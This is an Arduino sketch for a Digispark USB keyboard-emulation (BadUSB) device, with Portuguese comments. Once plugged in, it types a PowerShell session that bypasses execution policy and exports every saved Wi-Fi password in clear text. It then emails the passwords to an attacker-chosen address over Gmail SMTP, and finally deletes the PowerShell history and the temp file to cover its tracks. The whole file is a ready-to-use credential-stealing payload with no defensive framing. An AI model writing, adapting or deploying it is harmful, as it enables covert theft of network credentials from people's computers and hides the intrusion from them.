
#include "DigiKeyboardPtBr.h"
void setup() {
}

char mode[] = "powershell -nop -exec bypass";
char separator[] = "read-host";

void loop() {
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print(mode);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.println("cd $env:temp");
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.println("netsh wlan export profile key=clear");
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > temp.csv");
  DigiKeyboardPtBr.delay(6000);
  
  //from email address:
  DigiKeyboardPtBr.print(F("$email = \"EMAIL\";"));
  //to email address
  DigiKeyboardPtBr.print(F("$addressee = \"SEU EMAIL\";"));
  // o lugar onde vai salvar as senhas
  DigiKeyboardPtBr.print(F("$tempcsv = \"$env:temp\\temp.csv\";"));
  // senha da sua conta
  DigiKeyboardPtBr.print(F("$pass = \"SENHA\";"));
  DigiKeyboardPtBr.print(F("$smtpServer = \"smtp.gmail.com\";"));
  DigiKeyboardPtBr.print(F("$port = \"587\";"));
  
  DigiKeyboardPtBr.print(F("$securestring = $pass | ConvertTo-SecureString -AsPlainText -Force;"));
  DigiKeyboardPtBr.print(F("$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $email, $securestring;"));
  DigiKeyboardPtBr.print(F("$msg = new-object Net.Mail.MailMessage;"));
  DigiKeyboardPtBr.print(F("$smtp = new-object Net.Mail.SmtpClient($smtpServer, $port);"));
  DigiKeyboardPtBr.print(F("$smtp.EnableSsl = $true;"));
  DigiKeyboardPtBr.print(F("$msg.From = \"$email\";"));
  DigiKeyboardPtBr.print(F("$msg.To.Add(\"$addressee\");"));
  DigiKeyboardPtBr.print(F("$msg.Attachments.Add(\"$tempcsv\");"));
  DigiKeyboardPtBr.print(F("$msg.BodyEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboardPtBr.print(F("$msg.SubjectEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboardPtBr.print(F("$msg.IsBodyHTML = $true ;"));
  DigiKeyboardPtBr.print(F("$msg.Subject = \"Senhas WIFI\";"));
  DigiKeyboardPtBr.print(F("$msg.Body = \"<h2> Aqui as suas senhas </h2></br>olha o arquivo...\"; "));
  DigiKeyboardPtBr.print(F("$SMTP.Credentials = $cred;"));
  DigiKeyboardPtBr.print(F("$smtp.Send($msg);"));
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println(separator);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println(mode);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println(F("del (Get-PSReadlineOption).HistorySavePath;"));
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println(F("rm \"$env:temp\\temp.csv\""));
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.println(separator);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("exit");
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.println("exit");
}
